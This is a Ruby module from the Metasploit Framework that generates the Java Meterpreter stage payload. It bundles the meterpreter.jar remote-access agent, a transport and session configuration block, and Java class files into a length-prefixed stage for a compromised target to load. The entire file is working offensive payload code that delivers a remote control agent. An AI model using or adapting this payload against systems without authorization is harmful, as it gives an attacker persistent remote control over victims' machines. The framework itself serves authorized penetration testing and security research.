##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/java'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'
require_relative '../../../../lib/java/meterpreter.rb'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Java Meterpreter',
                      'Description'   => 'Run a meterpreter server in Java',
                      'Author'        => ['mihi', 'egypt', 'OJ Reeves'],
                      'Platform'      => 'java',
                      'Arch'          => ARCH_JAVA,
                      'License'       => MSF_LICENSE,
                      'Session'       => Msf::Sessions::Meterpreter_Java_Java))
  end

  #
  # Used by stages; all java stages need to define +stage_class_files+ as an
  # array of .class files located in data/java/
  #
  # The staging protocol expects any number of class files, each prepended
  # with its length, and terminated with a 0:
  # [ 32-bit big endian length ][ first raw .class file]
  # ...
  # [ 32-bit big endian length ][ Nth raw .class file]
  # [ 32-bit null ]
  #
  def generate_stage(opts = {})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
    config = generate_config(opts)
    blocks = [
      [met.length, met].pack('NA*'),
      [config.length, config].pack('NA*')
    ]

    # Deliberate off by 1 here. The call to super adds a null terminator
    # so we would add 1 for the null terminate and remove one for the call
    # to super.
    block_count = blocks.length + stage_class_files.length

    # Pack all the magic together
    (blocks + [block_count]).pack('A*' * blocks.length + 'N')
  end

  def generate_config(opts = {})
    opts[:uuid] ||= generate_payload_uuid
    ds = opts[:datastore] || datastore

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      stageless:  opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def generate_default_stage(_opts = {})
    stage = ''
    stage_class_files.each do |path|
      data = MetasploitPayloads.read('java', path)
      stage << [data.length, data].pack('NA*')
    end
    stage << [0].pack('N')

    stage
  end

  def generate_classfiles
    Java::Meterpreter.meterpreter_classes(datastore.to_h, ['metasploit/TransletPayload.class'])
  end

  def generate(_opts = {})
    ''
  end
end
